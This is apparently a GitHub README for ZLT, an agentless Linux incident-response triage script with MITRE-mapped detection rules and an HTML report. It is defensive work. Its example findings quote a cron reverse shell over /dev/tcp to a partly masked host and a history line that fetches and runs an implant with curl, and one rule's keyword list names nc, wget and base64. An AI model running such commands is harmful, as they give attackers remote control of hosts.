<div align="center">

# ZLT — ZavetSec Linux Triage

**Agentless DFIR triage for Linux. No dependencies. Single script. Self-contained HTML report.**

[![Version](https://img.shields.io/badge/version-1.0-00ff88?style=flat-square&labelColor=0d1117)](https://github.com/zavetsec/ZLT)
[![Shell](https://img.shields.io/badge/shell-bash%204%2B-00ff88?style=flat-square&labelColor=0d1117)](https://github.com/zavetsec/ZLT)
[![Rules](https://img.shields.io/badge/detection-high--signal%20ruleset-ff6600?style=flat-square&labelColor=0d1117)](https://github.com/zavetsec/ZLT)
[![Modules](https://img.shields.io/badge/modules-12-ffaa00?style=flat-square&labelColor=0d1117)](https://github.com/zavetsec/ZLT)
[![License](https://img.shields.io/badge/license-MIT-aabbcc?style=flat-square&labelColor=0d1117)](LICENSE)

</div>

---

## What It Is

**ZLT (ZavetSec Linux Triage)** is a bash script for first-response DFIR triage of Linux hosts. Run it with a single command, collect telemetry across 12 modules, automatically analyze it against a curated ruleset mapped to MITRE ATT&CK, and get a self-contained interactive HTML report with a filterable findings table.

Built for situations where you need to understand what is happening on a host immediately — without installing agents, without internet access, without external dependencies. Drop it via SCP and run in 30–60 seconds.

---

## Quick Start

```bash
# Download
curl -sSO https://raw.githubusercontent.com/zavetsec/ZLT/main/ZLT.sh

# Verify integrity before running (recommended)
sha256sum ZLT.sh
# compare against the SHA256 published in the release notes

# Run as root
chmod +x ZLT.sh
sudo bash ZLT.sh

# Report is written to /tmp/ZLT_<hostname>_<timestamp>.html
# Copy to your workstation:
scp root@TARGET:/tmp/ZLT_*.html ./
```

> **Without root** the script still runs, but some modules (shadow hashes, `/proc/*/exe`, journald) will return incomplete data.

<img width="1403" height="832" alt="image" src="https://github.com/user-attachments/assets/7850af2e-6bd4-40cf-90a9-c0db2cc53b86" />

---

## Telemetry Modules

| # | Module | What It Collects |
|---|--------|-----------------|
| 01 | **System Info** | OS, kernel, architecture, uptime, timezone |
| 02 | **Users & Accounts** | /etc/passwd, shadow hashes, sudo/wheel groups, UID 0 accounts |
| 03 | **Network** | Listening ports, established connections, interfaces, routes, ARP |
| 04 | **Processes** | ps auxf, pstree, /proc/\*/exe, unpackaged binaries (PROC-005) |
| 05 | **Persistence** | Cron (all levels), systemd units, .bashrc/.zshrc, authorized\_keys |
| 06 | **File System** | SUID/SGID, world-writable dirs, /tmp + /dev/shm, binaries modified in 24h |
| 07 | **Log Analysis** | auth.log / journald (PAM, sudo, SSH), wtmp/last |
| 08 | **Network Config** | iptables/nft, UFW, /etc/hosts, resolv.conf |
| 09 | **Packages** | dpkg/rpm inventory, install/upgrade history (last 7 days) |
| 10 | **Kernel Modules** | lsmod, non-standard .ko files |
| 11 | **Shell & History** | Environment variables, bash/zsh/fish history (root + all users) |
| 12 | **Container / Cloud** | Docker/LXC detection, AWS/GCP/Azure metadata, virtualisation type |

<img width="1406" height="888" alt="image" src="https://github.com/user-attachments/assets/35cec552-eae3-45e8-89b9-ae2f4eca91b8" />

---

## Detection Rules

34 curated, high-signal rules — each mapped to a MITRE ATT&CK tactic, tuned to minimize false positives, and weighted with five severity levels (CRITICAL / HIGH / MEDIUM / LOW / INFO). The focus is on rules that catch things that matter in real incidents, not on rule count.

Each finding in the report carries full context — rule ID, MITRE tactic, severity, and detail — so you can act immediately without cross-referencing a wiki:

```
Severity  Rule ID    Title                                          MITRE Tactic          Detail
────────  ─────────  ─────────────────────────────────────────────  ────────────────────  ─────────────────────────────────────────
CRITICAL  PERS-001   Suspicious commands in cron (reverse shell)    Persistence           */5 * * * * root bash -i >& /dev/tcp/...
HIGH      PROC-005   Binary not owned by any package                Defense Evasion       /usr/local/sbin/sshd-extra | PID=3847
HIGH      PROC-002   Process with deleted executable (fileless)     Defense Evasion       PID=4102 /proc/4102/exe (deleted)
HIGH      LOG-002    Direct root SSH login detected                 Initial Access        sshd Accepted publickey for root from ...
MEDIUM    KRN-002    Kernel module newer than modules.dep           Defense Evasion       /lib/modules/6.1.0/extra/hideproc.ko
```


<summary><strong>USR — Users</strong></summary>

| Rule | Severity | Description |
|------|----------|-------------|
| USR-001 | 🔴 CRITICAL | Accounts with UID 0 other than root |
| USR-002 | 🟡 MEDIUM | /etc/shadow modified within the last 7 days |
| USR-003 | 🟠 HIGH | Interactive accounts with an empty password hash |

</details>

<details>
<summary><strong>NET — Network</strong></summary>

| Rule | Severity | Description |
|------|----------|-------------|
| NET-001 | 🔵 LOW | Services listening on all interfaces (0.0.0.0) |
| NET-002 | 🟡 MEDIUM | Listening services on non-standard high ports (>40000) |
| NET-003 | ⚪ INFO | Active connections to external IP addresses |
| NET-004 | 🟡 MEDIUM | Non-standard entries in /etc/hosts (possible DNS hijacking) |
| NET-005 | 🟡 MEDIUM | Non-standard nameserver in resolv.conf |

</details>

<details>
<summary><strong>PROC — Processes</strong></summary>

| Rule | Severity | Description |
|------|----------|-------------|
| PROC-001 | 🟠 HIGH | Processes running from /tmp, /dev/shm, or /var/tmp |
| PROC-002 | 🟠 HIGH | Processes with deleted executable files (fileless indicator) |
| PROC-003 | 🔴 CRITICAL | Cryptominer process detected (xmrig, minerd, t-rex, etc.) |
| PROC-004 | 🟡 MEDIUM | Single process consuming more than 80% CPU |
| PROC-005 | 🟠 HIGH | **Processes with binaries not owned by any installed package** |

</details>

<details>
<summary><strong>PERS — Persistence</strong></summary>

| Rule | Severity | Description |
|------|----------|-------------|
| PERS-001 | 🔴 CRITICAL | Suspicious commands in cron (base64 / curl / wget / nc / reverse shell) |
| PERS-002 | 🟡 MEDIUM | Systemd unit files modified within the last 7 days |
| PERS-003 | 🔴 CRITICAL | authorized\_keys found in /tmp, /var/tmp, or /dev/shm |
| PERS-004 | 🟠 HIGH | Suspicious code injected into .bashrc or .profile |

</details>

<details>
<summary><strong>FS — File System</strong></summary>

| Rule | Severity | Description |
|------|----------|-------------|
| FS-001 | 🟠 HIGH | Non-standard SUID binaries (distro-aware whitelist applied) |
| FS-002 | 🟠 HIGH | Executable files found in /tmp, /dev/shm, or /var/tmp |
| FS-003 | 🟡 MEDIUM | System binaries modified within the last 24 hours |
| FS-004 | 🟡 MEDIUM | Suspicious hidden files in /tmp, /root, or /home |

</details>

<details>
<summary><strong>LOG / HIST / PKG / KRN / CNT / SYS</strong></summary>

| Rule | Severity | Description |
|------|----------|-------------|
| LOG-001 | 🟠 HIGH | Possible SSH brute-force (>20 failed authentication attempts) |
| LOG-002 | 🟠 HIGH | Direct root SSH login via sshd Accepted |
| LOG-003 | ⚪ INFO | sudo or su used to obtain root privileges |
| HIST-001 | 🟠 HIGH | Suspicious commands found in root bash/zsh history |
| HIST-002 | 🔵 LOW | Root command history is empty or unusually short |
| PKG-001 | 🟠 HIGH | Offensive security / penetration testing tools installed |
| KRN-001 | 🔴 CRITICAL | Suspicious kernel modules loaded (possible rootkit) |
| KRN-002 | 🟡 MEDIUM | Kernel modules newer than the current kernel's modules.dep |
| CNT-001..4 | ⚪ INFO | Container or cloud runtime environment detected |
| SYS-001 | 🟡 MEDIUM | Outdated Linux kernel (pre-4.15) |

</details>

---

## PROC-005: Processes Not Owned by Any Package

One of the core detection capabilities — cross-referencing every running process against the system's installed package database.

**What it catches:**
- Go/Rust backdoors compiled on the host or dropped into `/usr/local/bin`, `/opt`, `/srv`
- Renamed system utilities that no package claims (`/usr/bin/systemd-notifyd` — doesn't exist in any dpkg/rpm)
- C2 agents deployed without a package manager installer
- Any binary running from a standard system path that is unregistered in dpkg or rpm

**Algorithm:**

```
/proc/*/exe  ──►  readlink -f  ──►  filter to standard system paths
                                              │
                             dpkg -S <path>   or   rpm -qf <path>
                                              │
                                        [not found]
                                              │
                             HIGH finding: path | PID | process name | user
```

**Example output on detection:**

```
[HIGH] PROC-005  Processes with binaries not owned by any package (2 found)
  /usr/local/bin/telemetryd  |  PID=1337(telemetryd,user=root)
  /opt/monitoring/agent      |  PID=2048(agent,user=www-data)
```

**Clean system output:**

```
All running binaries are owned by installed packages
```

---

## HTML Report

A self-contained HTML file — no external requests, no CDN, works fully offline.

**Three tabs:**

- **Findings** — filterable table with columns for Severity, Rule ID, Title, MITRE Tactic, and Detail
- **Telemetry** — all collected raw data in labelled collapsible accordion blocks
- **System Info** — host overview table and detection rules reference

**Design language:** dark background (`#0d1117`), green accent (`#00ff88`), JetBrains Mono + Rajdhani fonts, color-coded severity badge system, scanline texture overlay.

---

## Compatibility

| Distribution | Status | Notes |
|-------------|--------|-------|
| Kali / Parrot / BlackArch | ✅ Full | kismet, chrome-sandbox, polkit excluded from FS-001 whitelist |
| Ubuntu / Debian / Mint | ✅ Full | |
| RHEL / CentOS / AlmaLinux / Rocky | ✅ Full | rpm fallback for package ownership checks |
| Fedora / openSUSE | ✅ Full | |
| Alpine Linux | ⚠️ Partial | No systemd/journald; bash must be installed separately |
| RHEL 6 / CentOS 6 | ⚠️ Partial | No `ss` binary; falls back to netstat |
| Docker / LXC container | ⚠️ Partial | systemd and lsmod unavailable inside container |
| OpenWrt / embedded Linux | ❌ Not supported | |

**Requirements:** bash 4+, root/sudo recommended for complete coverage.

---

## Architecture

```
ZLT.sh  (single-file, ~1350 lines, fully auditable, no external dependencies)
│
├── Helpers
│   └── safe_run · html_esc · add_finding · telem_section
│
├── Modules 1–12
│   └── each module: collect telemetry → analyse inline → add_finding()
│
└── HTML Report Builder  (heredoc)
    ├── Tab: Findings    filterable table, severity badges, MITRE column
    ├── Tab: Telemetry   raw output in collapsible blocks, 9 sections
    └── Tab: System Info host details + rules summary table
```

**Delimiter design:** findings are stored in `FINDINGS_ARR[]` using ASCII Unit Separator (`$'\x1f'`, 0x1F) as the field delimiter. This guarantees correct parsing regardless of what characters appear in finding titles or detail text — unlike naive `|||` approaches that break when a pipe character appears in output.

---

## Log Collection Strategy

The script is aware that modern Debian/Ubuntu/Kali systems do not write to `/var/log/auth.log` by default — they log exclusively to journald. The collection logic handles both cases transparently:

```
1. Try /var/log/auth.log or /var/log/secure  (traditional syslog)
       ↓ if not found or empty
2. journalctl _COMM=sudo _COMM=sshd _COMM=login + SYSLOG_FACILITY=10
       ↓
3. Report shows source: "file" or "journald (...)"
```

Shell history collection is similarly adaptive — the script detects whether root uses bash, zsh, or fish from `/etc/passwd` and reads the correct history file accordingly.

---

## How It Compares

ZLT is not trying to be a full forensic platform. It fills a specific gap: **seconds, not minutes — no deployment, no server, no agent**. The kind of triage you run before you even know if there is an incident.

| Tool | Agentless | Offline | Time to first findings | Output |
|------|-----------|---------|----------------------|--------|
| **ZLT** | ✅ yes | ✅ yes | **~60 seconds** | Self-contained HTML |
| Velociraptor | ❌ agent required | ⚠️ server required | minutes | Web UI |
| UAC (Unix Artifact Collector) | ✅ yes | ✅ yes | 5–15 minutes | Raw artifact archive |
| osquery | ❌ agent required | ❌ no | ongoing | SQL query results |
| LiME + Volatility | ✅ yes | ✅ yes | 10+ minutes | Memory dump + analysis |

ZLT is the only tool in this category that is simultaneously agentless, offline-capable, and done in under a minute.

---

## Security & Trust

The script is designed to be auditable and safe to run in sensitive environments.

- **No data exfiltration.** The script makes no outbound network connections (cloud metadata probes use a 2-second timeout and are clearly labelled in the code).
- **Read-only collection.** The only file written is the HTML report in `/tmp/`. Nothing else is created, modified, or deleted.
- **No external dependencies.** No curl-to-bash pipelines, no package installs, no Python modules. Pure bash and standard POSIX tools.
- **Fully auditable.** Single-file, ~1350 lines of plain bash. Read it before you run it — it takes less time than deploying an agent.
- **Integrity verification.** SHA256 checksums are published with each release. Verify before running on production hosts.

---

## SOC Workflow

```
Alert fires in SIEM
        │
        ▼
scp ZLT.sh root@TARGET:/tmp/
ssh root@TARGET "bash /tmp/ZLT.sh"
        │
        ▼
scp root@TARGET:/tmp/ZLT_*.html ./
        │
        ▼
Open report ──► Findings tab ──► filter HIGH / CRITICAL
        │
        ▼
Escalate to L3  /  engage IR team  /  close as false positive
```

---

## Example Use Case

A web server starts generating unusual outbound traffic. No alert from the WAF. A junior analyst runs ZLT to get the first picture.

**Report produced in ~50 seconds. Findings:**

```
[HIGH]   PROC-005  Unpackaged binary running as root
         /usr/local/sbin/sshd-extra | PID=3847(sshd-extra,user=root)

[HIGH]   PROC-001  Process running from suspicious directory
         /tmp/.x11-unix-backup/tunnel | PID=3901(tunnel,user=www-data)

[HIGH]   NET-002   Listening service on non-standard high port
         0.0.0.0:54321 — process: sshd-extra (PID 3847)

[CRIT]   PERS-001  Reverse shell in crontab
         */5 * * * * root bash -i >& /dev/tcp/185.220.x.x/4444 0>&1

[HIGH]   HIST-001  Suspicious commands in root history
         curl -sSL http://185.220.x.x/implant -o /usr/local/sbin/sshd-extra
         chmod +x /usr/local/sbin/sshd-extra && /usr/local/sbin/sshd-extra -D
```

**What happened:** the attacker exploited a vulnerable PHP upload endpoint, wrote a renamed binary to `/usr/local/sbin/` (outside any package), established a persistent reverse tunnel on port 54321, and added a cron-based fallback in case the tunnel dropped.

All five indicators surfaced in a single triage run. Total time from "something is wrong" to "here is exactly what is running and how it persists": **under 2 minutes**.

---

## Roadmap

- [ ] **Baseline diff mode** — snapshot a clean host state and compare on subsequent runs; flag any deviation in running processes, listening ports, SUID binaries, or cron entries
- [ ] **Persistence timeline** — correlate cron, systemd units, .bashrc, and authorized_keys modification timestamps into a single ordered view to reconstruct when persistence was established
- [ ] **JSON output flag** — `--json` mode to emit structured findings for ingestion into SOAR platforms, ticketing systems, or log aggregators
- [ ] **Remote multi-host mode** — accept a target list and run triage over SSH in parallel, aggregating all reports into a single summary index HTML
- [ ] **YARA integration** — optional scan of running process memory maps and files in /tmp against a user-supplied YARA ruleset

---

## License

MIT — use it, fork it, build on it. Attribution is appreciated.

---

<div align="center">

**[ZavetSec](https://github.com/zavetsec)** · DFIR tooling · open source

</div>
